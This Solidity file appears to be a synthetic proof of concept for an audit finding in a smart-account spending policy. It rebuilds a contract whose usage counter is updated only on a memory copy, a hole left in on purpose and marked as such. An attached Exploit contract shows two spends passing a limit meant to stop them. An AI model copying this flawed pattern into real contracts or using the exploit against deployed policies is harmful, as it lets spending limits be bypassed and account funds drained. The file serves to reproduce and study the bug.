// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Biconomy / Rhinestone UniActionPolicy — usage is not stored
    (Cantina, AuditVault 42095). SYNTHETIC, cheatcode-free.

    Root cause: ParamRule.check takes the rule in memory and is view.
    rule.usage.used += param updates the copy. The next call still sees 0.

    Verbatim limit block from UniActionPolicy.sol before PR 76
    (erc7579/smartsessions@a6fc609c6357733e000a08705a99f613ce8841ed):

        function check(ParamRule memory rule, bytes calldata data) internal view returns (bool) {
            if (rule.isLimited) {
                if (rule.usage.used + uint256(param) > rule.usage.limit) return false;
                rule.usage.used += uint256(param);
            }
        }

    Limit is 100 USD. Two spends of 60 USD both pass. Together they move 120 USD,
    which is 20 USD over the limit. Storage used stays 0. The control writes
    usage in storage, and the second spend reverts. */

uint256 constant VALIDATION_SUCCESS = 0;
uint256 constant VALIDATION_FAILED = 1;

contract Usd {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct LimitUsage {
    uint256 limit;
    uint256 used;
}

struct ParamRule {
    uint64 offset;
    bool isLimited;
    LimitUsage usage;
}

interface IActionPolicy {
    function initialize(address account, uint256 limit) external;
    function checkAction(address account, uint256 value, bytes calldata data) external returns (uint256);
    function used(address account) external view returns (uint256);
    function limitOf(address account) external view returns (uint256);
}

contract UniActionPolicy is IActionPolicy {
    mapping(address => ParamRule) internal rules;

    function initialize(address account, uint256 limit) external {
        ParamRule storage rule = rules[account];
        rule.offset = 32;
        rule.isLimited = true;
        rule.usage.limit = limit;
        rule.usage.used = 0;
    }

    function used(address account) external view returns (uint256) {
        return rules[account].usage.used;
    }

    function limitOf(address account) external view returns (uint256) {
        return rules[account].usage.limit;
    }

    function checkAction(address account, uint256 value, bytes calldata data) external view returns (uint256) {
        require(value == 0, "value");
        ParamRule memory rule = rules[account];
        if (!check(rule, data)) return VALIDATION_FAILED;
        return VALIDATION_SUCCESS;
    }

    function check(ParamRule memory rule, bytes calldata data) internal view returns (bool) {
        bytes32 param = bytes32(data[4 + rule.offset:4 + rule.offset + 32]);
        if (rule.isLimited) {
            if (rule.usage.used + uint256(param) > rule.usage.limit) {
                return false;
            }
            // @> VULN: rule is a memory copy and check is view, so this increment never lands in storage
            rule.usage.used += uint256(param);
        }
        return true;
    }
}

contract SmartAccount {
    IActionPolicy public policy;
    Usd public usd;

    constructor(IActionPolicy _policy, Usd _usd) {
        policy = _policy;
        usd = _usd;
    }

    function spend(uint256 amount) external {
        bytes memory data = abi.encodeWithSelector(bytes4(0xa9059cbb), msg.sender, amount);
        uint256 code = policy.checkAction(address(this), 0, data);
        require(code == VALIDATION_SUCCESS, "limit");
        usd.transfer(msg.sender, amount);
    }
}

contract Exploit {
    Usd public usd; // nonce 1
    UniActionPolicy public policy; // nonce 2
    SmartAccount public account; // nonce 3

    constructor() {
        usd = new Usd();
        policy = new UniActionPolicy();
        account = new SmartAccount(IActionPolicy(address(policy)), usd);
    }

    function run() external {
        usd.mint(address(account), 120 ether);
        policy.initialize(address(account), 100 ether);
        account.spend(60 ether);
        account.spend(60 ether);
        uint256 storedUsed = policy.used(address(account));
        uint256 taken = usd.balanceOf(address(this));
        uint256 left = usd.balanceOf(address(account));
        require(policy.limitOf(address(account)) == 100 ether, "limit 100");
        require(storedUsed == 0, "usage not stored");
        require(taken == 120 ether, "moved 120");
        require(left == 0, "account emptied");
        require(taken - 100 ether == 20 ether, "20 over the limit");
    }
}
